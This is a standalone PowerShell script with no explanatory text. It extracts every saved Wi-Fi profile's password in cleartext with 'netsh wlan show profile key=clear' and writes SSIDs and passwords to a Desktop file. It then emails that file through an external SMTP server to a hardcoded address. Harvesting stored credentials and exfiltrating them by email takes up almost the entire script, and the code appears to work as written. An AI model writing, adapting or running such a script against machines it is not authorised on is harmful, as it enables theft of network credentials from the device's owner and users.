$outputFile = "$env:USERPROFILE\Desktop\WiFiPasswords.txt"

$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }

"Wi-Fi SSID and Password List" | Out-File -FilePath $outputFile
"===================================" | Out-File -FilePath $outputFile -Append

foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $ssid = $profile
    $password = ($details | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
    $output = "SSID: $ssid"
    if ($password) {
        $output += " | Password: $password"
    } else {
        $output += " | Password: Not Found"
    }
    $output | Out-File -FilePath $outputFile -Append
}
$smtpServer = "smtp.simply.com"   # Replace with your SMTP server
$smtpPort = 587                 # Common SMTP port
$fromEmail = "michael@winther.info" # Replace with your email address
$toEmail = "michael@winther.info" # Replace with the recipient's email address
$emailSubject = "File from Desktop"
$emailBody = "Please find the attached file."
$filePath = "$env:USERPROFILE\Desktop\WiFiPasswords.txt" # Replace 'yourfile.txt' with the file name
$smtpCredential = Get-Credential   # Prompts for email credentials

if (-Not (Test-Path -Path $filePath)) {
    Write-Host "File not found: $filePath" -ForegroundColor Red
    exit
}

Send-MailMessage -From $fromEmail -To $toEmail -Subject $emailSubject `
    -Body $emailBody -SmtpServer $smtpServer -Port $smtpPort `
    -Credential $smtpCredential -UseSsl -Attachments $filePath

Write-Host "Email sent successfully!" -ForegroundColor Green

